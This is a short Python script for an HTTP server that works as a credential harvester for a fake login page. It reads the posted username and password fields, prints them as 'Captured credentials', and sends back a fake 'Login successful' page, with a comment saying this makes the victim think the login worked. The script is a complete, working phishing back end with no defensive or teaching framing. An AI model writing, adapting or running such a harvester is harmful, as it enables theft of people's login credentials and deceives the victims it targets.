from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class LoggingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Just respond OK for any GET requests (CSS, images, favicon)
        self.send_response(200)
        self.end_headers()
    
    def do_POST(self):
        # Read the posted form data
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode('utf-8')
        data = urllib.parse.parse_qs(body)
        
        username = data.get('userName', [''])[0]
        password = data.get('password', [''])[0]
        
        print(f"\n[!] Captured credentials:")
        print(f"Username: {username}")
        print(f"Password: {password}\n")
        
        # Send a fake success response so the victim thinks login worked
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body>Login successful (redirecting...)</body></html>")
    
    def log_message(self, format, *args):
        # Suppress verbose logging (optional)
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), LoggingHandler)
    print("[*] Listening on port 8000 - waiting for POST with credentials...")
    server.serve_forever()
